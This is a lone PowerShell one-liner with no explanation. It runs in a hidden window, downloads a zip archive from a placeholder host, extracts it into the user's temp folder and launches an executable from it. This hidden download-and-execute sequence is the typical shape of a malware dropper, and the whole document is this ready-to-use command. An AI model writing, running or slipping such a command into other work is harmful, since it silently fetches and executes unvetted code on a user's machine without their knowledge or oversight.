powershell -NoProfile -WindowStyle Hidden -Command "$u='https://exemplu.com/fișier.zip'; $z=\"$env:TEMP\fișier.zip\"; $d=\"$env:TEMP\extrase\"; Invoke-WebRequest -Uri $u -OutFile $z; Expand-Archive -Path $z -DestinationPath $d -Force; Start-Process \"$d\program.exe\""
